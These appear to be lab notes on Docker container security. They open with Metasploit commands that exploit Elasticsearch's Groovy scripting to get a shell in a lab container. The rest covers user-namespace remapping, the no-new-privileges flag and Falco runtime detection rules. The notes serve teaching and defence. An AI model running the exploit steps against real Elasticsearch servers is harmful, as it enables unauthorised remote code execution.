### --> EXPLOIT ELASTIC VIA METASPLOIT
#### > Start Metasploit 
docker run -it --link es:es --entrypoint bash benhall/metasploit
chmod +x start.sh && ./start.sh
#### > Exploit ES
use exploit/multi/elasticsearch/search_groovy_script
set TARGET 0
set RHOST es
exploit
#### > Shell access
ls
ls /


### --> You can start remapping UIDs in Docker Engine with the --userns-remap flag.
sudo docker daemon --userns-remap=<user>
#### > Remapped engine will basically operate in a new environment (in the 100000.100000 directory). 
Every remapping will get its own directory (format XXX.YYY where XXX is the subordinate UID and YYY is the subordinate GID) 
We can see it by :-
sudo ls -F /var/lib/docker/100000.100000/


### --> Example for using No New Privileges flag to restrict additional access [no_new_privs]
#### > Create a setuid binary that displays the effective uid
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char *argv[])
{
        printf("Effective uid: %d\n", geteuid());
        return 0;
}
[$ dockerfiles]# make testnnp
cc     testnnp.c   -o testnnp

Add this to th edocker image.
Run docker with command to get effective uuid :- docker run -it --rm --user=1000 --security-opt=no-new-privileges testnnp

### --> CONTAINER SECURITY USING FALCO
#### > Sysdig Falco installation
sudo -s
mkdir /etc/falco
cp falco.yaml falco_rules.yaml /etc/falco
touch /var/log/falco_events.log

#### > We can pull and launch the Sysdig Falco containerdocker pull sysdig/falco
docker run -d --name falco --privileged \
  -v /var/run/docker.sock:/host/var/run/docker.sock \
  -v /dev:/host/dev \
  -v /proc:/host/proc:ro \
  -v /boot:/host/boot:ro \
  -v /lib/modules:/host/lib/modules:ro \
  -v /usr:/host/usr:ro \
  -v /etc/falco/falco.yaml:/etc/falco/falco.yaml \
  -v /etc/falco/falco_rules.yaml:/etc/falco/falco_rules.yaml \
  -v /var/log/falco_events.log:/var/log/falco_events.log \
  sysdig/falco

#### > Run your docker container and if we tail the log file :- 
/var/log/falco_events.log
We shall get any message that shall be triggered by an event specified in falcorules.yaml

#### > Install a new version of the configuration file
sudo cp falco_rules_3.yaml /etc/falco/falco_rules.yaml   // Unauthorized process
sudo cp falco_rules_4.yaml /etc/falco/falco_rules.yaml   //Write to a non user data directory
sudo cp falco_rules_5.yaml /etc/falco/falco_rules.yaml   //Sensitive mount by container

#### > To apply the new configuration file we will restart the Sysdig Falco container
docker restart falco

#### > Event Generator
Falco has a synthetic event generator that shows off all the capabilities of the default ruleset.
To pull and launch the event:-
docker pull sysdig/falco-event-generator
docker run -d --name falco-event-generator sysdig/falco-event-generator
